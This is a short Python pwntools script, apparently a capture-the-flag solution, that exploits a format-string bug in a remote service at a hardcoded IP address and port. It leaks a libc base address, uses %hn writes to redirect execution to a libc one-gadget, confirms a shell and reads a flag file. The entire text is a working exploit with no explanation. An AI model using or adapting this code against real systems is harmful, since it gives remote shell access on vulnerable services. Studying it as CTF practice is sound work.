#!/usr/bin/env python
from pwn import *

l = ELF( './libc-2.27.so' )
host , port = '60.251.236.18' , 10004

def fmt( p ):
    y.send( p )
    sleep( 0.2 )

fd = 0x404010

while True:
    y = remote( host , port )

    fmt( '%{}c%7$hn'.format( 0x4010 ) )
    fmt( '%{}c%9$hhn'.format( 1 ) )

    fmt( '%10$p.'.ljust( 0x30 , '\x00' ) )
    l.address = int( y.recvuntil( '.' )[:-1] , 16 ) - 0x21b97
    success( 'libc -> %s' % hex( l.address ) )
    try:
        one = l.address + 0x4f322
        g = 0x88

        fmt( '%{}c%5$hhn'.format( g ) )
        fmt( '%{}c%7$hn'.format( one & 0xffff ) )
        fmt( '%{}c%5$hhn'.format( g + 2 ) )
        fmt( '%{}c%7$hhn'.format( (one & 0xff0000) >> 16 ) )

        fmt( 'exit' )

        y.sendline( 'echo 123' )
        y.recvuntil( '123' )

        y.sendline( 'cat /home/`whoami`/flag' )

        y.interactive()
        y.close()
    except:
        y.close()

y.interactive()